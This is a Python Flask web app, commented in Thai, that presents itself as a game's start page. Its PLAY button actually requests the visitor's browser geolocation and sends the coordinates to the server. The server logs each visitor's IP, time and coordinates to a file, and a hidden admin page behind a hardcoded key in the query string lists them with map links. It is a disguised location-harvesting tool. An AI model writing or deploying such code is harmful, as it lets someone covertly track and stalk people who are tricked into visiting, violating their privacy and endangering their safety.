from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# 🔐 รหัส admin
ADMIN_KEY = "0949205717As"

# 🎮 หน้าเว็บหลัก
@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Game Start</title>
<style>
body {
    background: radial-gradient(circle, #1e1e2f, #000);
    color: white;
    text-align: center;
    font-family: Arial;
    padding-top: 100px;
}
.box {
    background: rgba(0,0,0,0.6);
    padding: 40px;
    border-radius: 20px;
    width: 320px;
    margin: auto;
    box-shadow: 0 0 20px #6c5ce7;
}
button {
    padding: 12px 25px;
    border: none;
    border-radius: 10px;
    background: #6c5ce7;
    color: white;
    font-size: 16px;
    cursor: pointer;
}
button:hover {
    background: #a29bfe;
}
</style>
</head>
<body>

<div class="box">
    <h1>🎮 START GAME</h1>
    <p>กดเพื่อเริ่ม</p>
    <button onclick="getLocation()">PLAY</button>
</div>

<script>
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition);
    } else {
        alert("Browser ไม่รองรับ");
    }
}

function sendPosition(position) {
    fetch("/location", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            lat: position.coords.latitude,
            lon: position.coords.longitude
        })
    }).then(() => {
        alert("โหลดเสร็จ!");
    });
}
</script>

</body>
</html>
"""

# 📍 รับตำแหน่ง
@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")
    ip = request.remote_addr
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt", "a") as f:
        f.write(f"{time}|{ip}|{lat},{lon}\n")

    return jsonify({"status": "ok"})


# 📊 หน้า admin
@app.route("/admin")
def admin():
    key = request.args.get("key")
    if key != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""

    try:
        with open("log.txt", "r") as f:
            for line in f:
                time, ip, loc = line.strip().split("|")
                lat, lon = loc.split(",")

                map_link = f"https://www.google.com/maps?q={lat},{lon}"

                rows += f"""
                <tr>
                    <td>{time}</td>
                    <td>{ip}</td>
                    <td>{lat},{lon}</td>
                    <td><a href="{map_link}" target="_blank">📍 Map</a></td>
                </tr>
                """
    except:
        rows = "<tr><td colspan='4'>No data</td></tr>"

    return f"""
    <html>
    <body style="background:#111;color:white;font-family:Arial">
    <h1>📊 Admin</h1>
    <table border="1" style="width:100%;text-align:center">
    <tr>
        <th>Time</th>
        <th>IP</th>
        <th>Location</th>
        <th>Map</th>
    </tr>
    {rows}
    </table>
    </body>
    </html>
    """

# 🚀 สำหรับ Render
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
